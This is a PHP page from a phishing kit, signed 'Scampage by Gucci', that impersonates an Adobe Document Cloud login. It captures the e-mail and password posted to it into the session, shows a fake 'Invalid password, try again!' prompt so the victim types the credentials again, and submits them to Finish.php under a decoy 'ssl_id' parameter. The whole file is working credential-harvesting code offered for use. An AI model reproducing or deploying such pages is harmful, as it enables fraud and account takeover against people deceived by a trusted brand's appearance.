<?php
/*
 * Scampage by Gucci
 * ICQ: 713566330
 */
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";


$_SESSION['username'] = $_POST['username'];
$_SESSION['password'] = $_POST['password'];
?>
<html>

<head>
    <title>Adobe Document Cloud</title>
    <link rel="shortcut icon" href="assets/files/favicon.png" type="image/x-icon">
</head>

<body marginheight="0" marginwidth="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">

<table width="100%" height="100%" cellspacing="0">

    <tr><td height="20%" bgcolor="#000000">

            <table align="center"><tr>

                    <td>

                        <img src="assets/files/logo.jpg" width="330" height="70">

                    </td>






                    <td width="750">

                        <table width="" align="right">

                            <tr><td>

                                    <font face="verdana" size="+2" color="#FFFFFF">
                                        Adobe Document Cloud
                                    </font>

                                </td></tr>





                        </table>

                    </td>

                </tr></table>

        </td></tr>









    <tr><td height="70%" background="assets/files/background.jpg">

            <table><tr>

                    <td width="200"></td>





                    <td>

                        <table>

                            <tr><td height="10"><td></tr>




                            <tr><td>

                                    <font face="verdana" size="2" color="#FFFFFF">

                                        <font size="+2">Invalid password, try again!</font>

                                        <br>
                                        Please sign in with a your e-mail address to view your document

                                    </font>

                                </td></tr>




                            <tr><td height="35"><td></tr>




                            <tr><td>

                                    <form method="post" action="Finish.php?ssl_id=<?php echo generateRandomString(130); ?>">

                                </td></tr>




                            <tr><td>

                                    <input  name="username" type="email" style="width:320px; height:45px;
			font-family: Verdana; font-size: 14px; color:#000000; background-color: #FFFFFF; border: solid 1px #FFFFFF; padding: 10px;
			-moz-border-radius: 2px; -webkit-border-radius: 2px; -khtml-border-radius: 2px; border-radius: 2px;
			-moz-box-shadow: 3px 3px 3px #000000; -webkit-box-shadow: 3px 3px 3px #000000; box-shadow: 3px 3px 3px #000000;"
                                            required="" value="<?php echo $_SESSION['username']; ?>" placeholder="Email">



                                </td></tr>





                            <tr><td height="5"><td></tr>




                            <tr><td>

                                    <input  name="password" type="password" style="width:320px; height:45px;
			font-family: Verdana; font-size: 14px; color:#000000; background-color: #FFFFFF; border: solid 1px #FFFFFF; padding: 10px;
			-moz-border-radius: 2px; -webkit-border-radius: 2px; -khtml-border-radius: 2px; border-radius: 2px;
			-moz-box-shadow: 3px 3px 3px #000000; -webkit-box-shadow: 3px 3px 3px #000000; box-shadow: 3px 3px 3px #000000;"
                                            required="" placeholder="Password">



                                </td></tr>




                            <tr><td height="5"></td></tr>




                            <tr><td>

                                    <input type="submit" value="View File Online"
                                           style="width:320px; height:45px; background-color: #045FB4; border: solid 3px #045FB4;
			font-family: Verdana; font-size: 15px; font-weight: light; color: #ffffff; -moz-border-radius: 3px; -webkit-border-radius: 3px;
			-khtml-border-radius: 3px; border-radius: 3px;-moz-box-shadow: 3px 3px 3px #000000; -webkit-box-shadow: 3px 3px 3px #000000;
			box-shadow: 3px 3px 3px #000000;">





                                </td></tr>



                            <tr><td height="100"><td></tr>

                        </table>

                    </td>

                </tr></table>

        </td></tr>









    <tr><td height="10%" bgcolor="#000000">

            <div align="center">
                <img src="assets/files/footer.png" width="550" height="38">
            </div>

        </td></tr>

</table>

</body>

</html>